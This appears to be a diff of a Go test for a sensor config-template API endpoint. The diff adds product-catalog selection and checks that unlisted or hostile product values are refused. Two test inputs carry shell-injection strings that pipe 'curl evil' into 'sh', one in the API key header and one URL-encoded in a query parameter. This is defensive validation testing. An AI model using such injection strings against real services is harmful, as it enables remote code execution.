@@ -32,13 +32,17 @@ import (
 // (and its fingerprint) when SENSOR_CA_CERT_FILE names a certificate.
 func TestSensorConfigTemplates_Endpoint(t *testing.T) {
 	f := newFleetHarness(t, sensordom.HealthPolicy{})
-	f.sh.SetTemplateService(sensor.NewSensorConfigTemplateService("../../../../configs/sensor-templates", logger.NewNop()))
+	f.sh.SetTemplateService(sensor.NewSensorConfigTemplateService("../../../../configs/sensor-products", logger.NewNop()))
 	f.sh.SetPublicAPIURL("https://192.0.2.204")
-	f.sh.SetSensorImage("ghcr.io/openctemio/sensor:v0.4.2")
+	f.sh.SetProducts([]SensorInstallProduct{
+		{ID: sensordom.DefaultProduct, Latest: "v0.4.2", Image: "ghcr.io/openctemio/sensor:v0.4.2", Install: "sensor"},
+		{ID: "openctemio-connector-tenable", Latest: "v0.1.0", Image: "ghcr.io/openctemio/connector-tenable:v0.1.0",
+			Install: "connector-tenable", ReleaseIdentity: "https://github.com/openctemio/connector-tenable/.github/workflows/images.yml"},
+	})
 
-	call := func(key string) (*httptest.ResponseRecorder, SensorConfigTemplatesResponse) {
+	callProduct := func(key, query string) (*httptest.ResponseRecorder, SensorConfigTemplatesResponse) {
 		t.Helper()
-		req := httptest.NewRequest(http.MethodGet, "/api/v1/sensors/"+f.sensorID+"/config-templates", nil)
+		req := httptest.NewRequest(http.MethodGet, "/api/v1/sensors/"+f.sensorID+"/config-templates"+query, nil)
 		if key != "" {
 			req.Header.Set("X-Sensor-API-Key", key)
 		}
@@ -52,6 +56,10 @@ func TestSensorConfigTemplates_Endpoint(t *testing.T) {
 		var resp SensorConfigTemplatesResponse
 		_ = json.Unmarshal(rec.Body.Bytes(), &resp)
 		return rec, resp
+	}
+	call := func(key string) (*httptest.ResponseRecorder, SensorConfigTemplatesResponse) {
+		t.Helper()
+		return callProduct(key, "")
 	}
 
 	// Without a key: every format, the env-var reference, no CA.
@@ -86,6 +94,26 @@ func TestSensorConfigTemplates_Endpoint(t *testing.T) {
 	// A header that is not a key shape is refused, not pasted into a shell line.
 	if rec, _ := call("rda_x'; curl evil | sh; '"); rec.Code != http.StatusBadRequest {
 		t.Errorf("malformed key header: status %d, want 400", rec.Code)
+	}
+
+	// The scanning sensor is the default product.
+	if resp.Product != sensordom.DefaultProduct {
+		t.Errorf("product = %q", resp.Product)
+	}
+	// Another catalog product: its own image, its own snippet set, and only
+	// the formats it ships.
+	rec, resp = callProduct("", "?product=openctemio-connector-tenable")
+	if rec.Code != http.StatusOK || resp.Product != "openctemio-connector-tenable" ||
+		resp.Image != "ghcr.io/openctemio/connector-tenable:v0.1.0" ||
+		!strings.Contains(resp.Docker, "ghcr.io/openctemio/connector-tenable:v0.1.0") ||
+		strings.Contains(resp.Docker, "ghcr.io/openctemio/sensor") || resp.Kubernetes != "" {
+		t.Errorf("connector snippets: status=%d product=%q image=%q k8s=%q\n%s", rec.Code, resp.Product, resp.Image, resp.Kubernetes, resp.Docker)
+	}
+	// A product the catalog does not list, or a hostile value, is refused.
+	for _, q := range []string{"?product=acme-custom", "?product=x%27%3Bcurl%20evil%7Csh"} {
+		if rec, _ := callProduct("", q); rec.Code != http.StatusBadRequest {
+			t.Errorf("%s: status %d, want 400", q, rec.Code)
+		}
 	}
 
 	// The platform CA from SENSOR_CA_CERT_FILE.
